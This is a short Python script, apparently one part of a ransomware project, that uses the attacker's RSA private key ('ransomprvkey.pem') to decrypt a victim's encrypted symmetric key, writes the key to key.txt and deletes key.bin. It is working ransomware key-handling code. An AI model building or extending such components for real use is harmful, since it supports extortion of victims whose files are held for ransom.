"""
Victim Public Key Recovery Program

- Decrypt encrypted symmetric key (key.bin) and stores the decrypted key in key.txt
"""

# Built-in
import os
import sys

# Dependencies
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

def decrypt():
    """
    Decrypt the encrypted symmetric key file (key.bin)
    """
    enc_key_name = "key.bin"
    dec_key_name = "key.txt"

    # Get Symmetric Key Contents
    contents = ""
    with open("key.bin", "rb") as read_key_bin:
        # Read Key Contents from the Private Key (owned by the Attacker)
        private_key = RSA.import_key(open("ransomprvkey.pem").read()) # Read the key from the private key file owned by the attacker
        enc_data = read_key_bin.read(private_key.size_in_bytes()) # Read in encrypted data from encrypted file using the size of the private key
        
        # Decrypt RSA
        cipher_rsa = PKCS1_OAEP.new(private_key)
        symmetric_Key = cipher_rsa.decrypt(enc_data)
        contents = symmetric_Key
        read_key_bin.close()
    
    # Write Decrypted key to file
    with open("key.txt", "w") as write_decrypted_symKey:
        write_decrypted_symKey.write(str(contents.decode("utf-8")))
        write_decrypted_symKey.close()

    # Delete encrypted file
    os.remove("key.bin")


def main():
    print("Victim's Public Key Recovery program")
    decrypt()

if __name__ == "__main__":
    main()
